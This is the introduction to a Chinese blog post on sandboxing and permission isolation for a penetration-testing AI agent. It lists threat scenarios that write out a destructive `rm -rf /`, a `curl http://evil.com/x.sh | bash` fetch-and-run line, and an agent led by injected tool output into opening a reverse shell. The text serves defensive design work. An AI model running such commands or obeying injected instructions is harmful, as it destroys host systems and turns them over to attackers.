## 1. 引言：从「能执行」到「敢执行」

前十二篇，我们一路把 Agent 从「会思考」做到「会执行」：它能规划、能调工具、能记忆、能观测、能控成本。但所有这些能力，最终都要落到一个动作上——**在真实系统上执行命令**。

而「执行」恰恰是整个渗透 Agent 里风险最高的一环。前面所有的约束层、白名单、预算控制，防的都是「Agent 想做什么」；而权限隔离与沙箱，防的是「Agent 真的做了什么之后，会造成多大破坏」。

先看几个真实会发生的场景：

* • Agent 生成的命令里带了一个 `rm -rf /`（可能是幻觉，也可能是被注入），如果直接以 root 执行，宿主机就没了。
* • 工具返回的响应里藏了恶意 payload，Agent 解析后触发了一个反弹 shell，把执行环境变成了攻击者的跳板。
* • 一次扫描误扫到了授权范围外的内网资产，因为执行环境本身能访问整个内网。
* • Agent 被诱导执行了 `curl http://evil.com/x.sh | bash`，把整个执行环境污染。
